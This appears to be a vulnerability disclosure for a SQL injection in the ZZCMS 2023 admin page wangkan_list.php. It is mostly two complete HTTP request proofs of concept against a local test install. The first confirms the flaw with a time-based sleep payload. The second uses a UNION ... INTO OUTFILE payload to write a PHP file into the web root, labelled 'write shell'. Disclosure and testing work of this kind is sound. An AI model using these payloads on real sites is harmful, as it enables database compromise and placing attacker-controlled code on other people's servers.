# zzcms-wangkan_list-sql注入

## Supplier

```
http://www.zzcms.net/
```

## Description

```
ZZCMS 2023 is a rapid site building system, product investment template program source code, can quickly build product investment network. For example, medical investment, health products investment, cosmetics investment, agricultural investment, pregnancy and child investment, alcohol and non-staple food.

sql injection vulnerability exists
```

## POC

Log in to the backend system and randomly grab a data packet with permission to replace it.

![image-20251029172815907](./zzcms-sql-inject2.assets/image-20251029172815907.png)

poc

```
GET /admin/wangkan_list.php?keyword=%25'union+SELECT+sleep(5)--+x HTTP/1.1
Host: 127.0.0.1:8888
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="92"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: iframe
Referer: http://127.0.0.1:8888/admin/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: http304ok=0; PHPSESSID=pvpehubud7epklbme9m4s69b0q;
Connection: close


```

write shell

![image-20251029172846012](./zzcms-sql-inject2.assets/image-20251029172846012.png)

![image-20251029172831721](./zzcms-sql-inject2.assets/image-20251029172831721.png)

```
GET /admin/wangkan_list.php?keyword=%25'union+SELECT+'<?php+phpinfo()%3b+%3f>'+into+outfile+'D:/code/php/zzcms2023/1.php'--+x HTTP/1.1
Host: 127.0.0.1:8888
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="92"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: iframe
Referer: http://127.0.0.1:8888/admin/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: http304ok=0; PHPSESSID=pvpehubud7epklbme9m4s69b0q; xywpwx_bakusername=admin; xywpwx_snsjjssbdvqm=aca496e77ae7ceff46c2f8e72f4235d5; qebak_efourcheck=be67da7f3e3c39cd439799a20c67f8b4; xywpwx_bakrnd=RV5D5hcFcuQb; xywpwx_loginebakckpass=f169887a020e3dca048190f831fb4bbe; xywpwx_baklogintime=1730969421;bigclassid=xxx\
Connection: close


```

